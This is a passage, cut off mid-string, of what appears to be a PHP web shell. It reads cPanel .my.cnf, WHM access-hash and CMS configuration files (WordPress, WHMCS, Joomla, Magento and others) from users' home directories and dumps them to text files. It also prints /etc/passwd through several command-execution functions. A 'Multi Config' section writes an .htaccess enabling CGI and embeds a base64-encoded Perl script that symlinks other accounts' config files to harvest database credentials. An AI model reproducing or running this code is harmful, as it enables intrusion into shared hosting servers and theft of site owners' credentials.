					"/home1/$user_Exc/public_html/bw-configs/config.ini" => "BosWeb",
					"/home1/$user_Exc/public_html/config/koneksi.php" => "Lokomedia",
					"/home1/$user_Exc/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home1/$user_Exc/public_html/clientarea/configuration.php" => "WHMCS",
					"/home1/$user_Exc/public_html/whm/configuration.php" => "WHMCS",
					"/home1/$user_Exc/public_html/whmcs/configuration.php" => "WHMCS",
					"/home1/$user_Exc/public_html/forum/config.php" => "phpBB",
					"/home1/$user_Exc/public_html/sites/default/settings.php" => "Drupal",						"/home1/$user_Exc/public_html/config/settings.inc.php" => "PrestaShop",
					"/home1/$user_Exc/public_html/app/etc/local.xml" => "Magento",
					"/home1/$user_Exc/public_html/joomla/configuration.php" => "Joomla",
					"/home1/$user_Exc/public_html/configuration.php" => "Joomla",
					"/home1/$user_Exc/public_html/wp/wp-config.php" => "WordPress",
					"/home1/$user_Exc/public_html/wordpress/wp-config.php" => "WordPress",
					"/home1/$user_Exc/public_html/wp-config.php" => "WordPress",
					"/home1/$user_Exc/public_html/admin/config.php" => "OpenCart",
					"/home1/$user_Exc/public_html/slconfig.php" => "Sitelok",
					"/home1/$user_Exc/public_html/application/config/database.php" => "Ellislab",
					"/home2/$user_Exc/.my.cnf" => "cpanel",
					"/home2/$user_Exc/.accesshash" => "WHM-accesshash",
					"/home2/$user_Exc/public_html/bw-configs/config.ini" => "BosWeb",
					"/home2/$user_Exc/public_html/config/koneksi.php" => "Lokomedia",
					"/home2/$user_Exc/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home2/$user_Exc/public_html/clientarea/configuration.php" => "WHMCS",
					"/home2/$user_Exc/public_html/whm/configuration.php" => "WHMCS",
					"/home2/$user_Exc/public_html/whmcs/configuration.php" => "WHMCS",
					"/home2/$user_Exc/public_html/forum/config.php" => "phpBB",
					"/home2/$user_Exc/public_html/sites/default/settings.php" => "Drupal",
					"/home2/$user_Exc/public_html/config/settings.inc.php" => "PrestaShop",
					"/home2/$user_Exc/public_html/app/etc/local.xml" => "Magento",
					"/home2/$user_Exc/public_html/joomla/configuration.php" => "Joomla",
					"/home2/$user_Exc/public_html/configuration.php" => "Joomla",
					"/home2/$user_Exc/public_html/wp/wp-config.php" => "WordPress",
					"/home2/$user_Exc/public_html/wordpress/wp-config.php" => "WordPress",
					"/home2/$user_Exc/public_html/wp-config.php" => "WordPress",
					"/home2/$user_Exc/public_html/admin/config.php" => "OpenCart",
					"/home2/$user_Exc/public_html/slconfig.php" => "Sitelok",
					"/home2/$user_Exc/public_html/application/config/database.php" => "Ellislab",
					"/home3/$user_Exc/.my.cnf" => "cpanel",
					"/home3/$user_Exc/.accesshash" => "WHM-accesshash",
					"/home3/$user_Exc/public_html/bw-configs/config.ini" => "BosWeb",
					"/home3/$user_Exc/public_html/config/koneksi.php" => "Lokomedia",
					"/home3/$user_Exc/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home3/$user_Exc/public_html/clientarea/configuration.php" => "WHMCS",
					"/home3/$user_Exc/public_html/whm/configuration.php" => "WHMCS",
					"/home3/$user_Exc/public_html/whmcs/configuration.php" => "WHMCS",
					"/home3/$user_Exc/public_html/forum/config.php" => "phpBB",
					"/home3/$user_Exc/public_html/sites/default/settings.php" => "Drupal",
					"/home3/$user_Exc/public_html/config/settings.inc.php" => "PrestaShop",
					"/home3/$user_Exc/public_html/app/etc/local.xml" => "Magento",
					"/home3/$user_Exc/public_html/joomla/configuration.php" => "Joomla",
					"/home3/$user_Exc/public_html/configuration.php" => "Joomla",
					"/home3/$user_Exc/public_html/wp/wp-config.php" => "WordPress",
					"/home3/$user_Exc/public_html/wordpress/wp-config.php" => "WordPress",
					"/home3/$user_Exc/public_html/wp-config.php" => "WordPress",
					"/home3/$user_Exc/public_html/admin/config.php" => "OpenCart",
					"/home3/$user_Exc/public_html/slconfig.php" => "Sitelok",
					"/home3/$user_Exc/public_html/application/config/database.php" => "Ellislab"
						);	
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("Exc_config/$user_Exc-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
			echo "<center><a href='?dir=$dir/Exc_config'><font color=lime>Done</font></a></center>";
			}else{
				
		echo "<form method=\"post\" action=\"\"><center>etc/passw ( Error ? <a href='?dir=$dir&do=passwbypass'>Bypass Here</a> )<br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
		echo file_get_contents('/etc/passwd'); 
		echo "</textarea><br><input type=\"submit\" value=\"GassPoll\"></td></tr></center>\n";
        }
}elseif($_GET['do'] == 'passwbypass') {
	echo '<center>Bypass etc/passw With:<br>
<table style="width:50%">
  <tr>
    <td><form method="post"><input type="submit" value="System Function" name="syst"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passth"></form></td>
    <td><form method="post"><input type="submit" value="Exec Function" name="ex"></form></td>	
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shex"></form></td>		
    <td><form method="post"><input type="submit" value="Posix_getpwuid Function" name="melex"></form></td>
</tr></table>Bypass User With : <table style="width:50%">
<tr>
    <td><form method="post"><input type="submit" value="Awk Program" name="awkuser"></form></td>
    <td><form method="post"><input type="submit" value="System Function" name="systuser"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passthuser"></form></td>	
    <td><form method="post"><input type="submit" value="Exec Function" name="exuser"></form></td>		
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shexuser"></form></td>
</tr>
</table><br>';


if ($_POST['awkuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
echo "</textarea><br>";
}
if ($_POST['systuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo system("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['passthuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo passthru("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['exuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo exec("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['shexuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("ls /var/mail");
echo "</textarea><br>";
}
if($_POST['syst'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo system("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['passth'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo passthru("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['ex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['shex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo shell_exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
echo '<center>';
if($_POST['melex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
for($uid=0;$uid<60000;$uid++){ 
$ara = posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
print "\n";
}
}
echo"</textarea><br><br>";
}
} elseif(isset($_GET['do']) && ($_GET['do'] == 'multiconfig'))
{	@ini_set('output_buffering',0); 
?>
                                                    <form action="?y=<?php echo $pwd; ?>&amp;do=multiconfig" method="post">
                                                        <br><br>
                                                        <center><b>
                                                                <font size=4>[ Multi Config Fucker ]</font>
                                                            </b></center>
                                                        <form method=post><br>
                                                            <center>
                                                                <table class='tabnet'>
                                                                    <tr>
                                                                        <th><b>Php Config</b></th>
                                                                        <th><b>Perl Config</b></th>
                                                                        <th><b>Litespeed Config Fucker</b></th>
                                                                        <th><b>Config Fucker .ini Method</b></th>
                                                                    </tr>
                                                                    <tr>
                                                                        <td><input class='inputzbut' type='submit' name='phpconfig' value="Php Config" /></td>
                                                                        <td>
                                                                            <input class='inputzbut' type='submit' name='perlconfig' value="Perl Config" />
                                                                        </td>
                                                                        <td>
                                                                            <input class='inputzbut' type='submit' name='lcf' value="Litespeed Config Fucker" />
                                                                        </td>
                                                                        <td>
                                                                            <input class='inputzbut' type='submit' name='configini' value="Config Fucker .ini Method" />
                                                                        </td>
                                                                    <tr>
                                                                </table>
                                                            </center>
                                                        </form><br>
                                                        <hr><br><br>
                                                        <?php
 @ini_set('html_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
@set_time_limit(0);

if(isset($_POST['configini']))
{ echo "<center/><b><font color=>[ Config .ini Method ]</font></b><br><br>";

  mkdir('multi_config', 0755);
    chdir('multi_config');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Error!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI \n AddType application/x-httpd-cgi .pl \n AddHandler cgi-script .pl \n AddHandler cgi-script .pl";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);

$configshell = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29udGVudD0iZW4tdXMiIC8+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4NCjx0aXRsZT5Db25maWcgRnVja2VyIFVzaW5nIC5pbmkgTWV0aG9kPC90aXRsZT4NCjxsaW5rIHJlbD0ic2hvcnRjdXQgaWNvbiIgaHJlZj0iaHR0cDovL3BuZy0zLmZpbmRpY29ucy5jb20vZmlsZXMvaWNvbnMvMTkzNS9yZWRfZ2Vtc192b2xfMi8xMjgvcjJfZHJhZ29uLnBuZyIvPg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmJvZHkgew0KCWJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7DQoNCn0NCi5uZXdTdHlsZTEgew0KIGZvbnQtZmFtaWx5OiBUYWhvbWE7DQogZm9udC1zaXplOiB4LXNtYWxsOw0KIGZvbnQtd2VpZ2h0OiBib2xkOw0KIGNvbG9yOiAjMDBmZjAwOw0KICB0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQo8L3N0eWxlPg0KPC9oZWFkPg0KJzsNCnN1YiBsaWx7DQogICAgKCR1c2VyKSA9IEBfOw0KJG1zciA9IHF4e3B3ZH07DQokZG9tYWluPSRtc3IuIi8iLiR1c2VyOw0KJGRvbWFpbj1+cy9cbi8vZzsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TU0kucGhwJywkZG9tYWluLid+fj5DTUYuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU1NJLnBocCcsJGRvbWFpbi4nfn4+Q01GLWZvcnVtLmluaScpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luYy9jb25maWcucGhwJywkZG9tYWluLid+fj5NeUJCLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk15QkItZm9ydW0uaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywkZG9tYWluLid+fj5PdGhlci5pbmknKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZfZ2xvYmFsLnBocCcsJGRvbWFpbi4nfn4+aW52aXNpby5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbGliL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PkJhbGl0YmFuZy5pbmknKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50cy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZ3MuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9jb25maWcucGhwJywkZG9tYWluLid+fj5QaHBCQi1mb3J1bS5pbmknKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Z1bmN0aW9ucy5waHAnLCRkb21haW4uJ35+PnBocGJiMy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWNzLmluaScpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG1jLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywkZG9tYWluLid+fj53aG1jczIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21hbmFnZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bWFuZ2V3aG1jcy5pbmknKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL29yZGVyL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5XaG05LmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9teXNob3AvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm15c2hvcC5pbmknKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnQuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0cy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlcy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlcy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcHBpbmcvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2hvcC1zaG9wcGluZy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2FsZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zYWxlLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlcjIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3AuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdwLWJldGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWJldGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndwMTMtcHJlc3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLWJldGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW5ld3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbmV3LmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93ZWIvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdlYi5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9ncy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmxvZ3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWhvbWUuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtcHJvdGFsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+Pm9yZHByZXNzLXNpdGUuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW1haW4uaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Rlc3Qvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXRlc3QuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWhvbWUuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb29tbGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLXByb3RhbC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtam9vLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1jbXMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1zaXRlLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYWluL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtbWFpbi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ld3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ldy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWhvbWUuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PlZCdWxsZXRpbi1mb3J1bS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIvaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+dmIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj52YjMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y3BhbmVsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+cGFuZWwuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3QuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3RpbmcuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0cy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj56ZW5jYXJ0LmluaScpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnplbmNhcnQtc2hvcC5pbmknKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zaG9wLVpDc2hvcC5pbmknKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21rX2NvbmYucGhwJywkcGRvbWFpbi4nfn4+bWstcG9ydGFsZTEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLmluaScpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc21mL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLXNtZi5pbmknKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtLmluaScpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW1zL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtcy5pbmknKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj51cGxvYWQuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2wvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+bWFsYXkuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGVzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGVudHMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudDIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnL2tvbmVrc2kucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZzIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N5c3RlbS9zaXN0ZW0ucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWExLmluaScpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZXMvZGVmYXVsdC9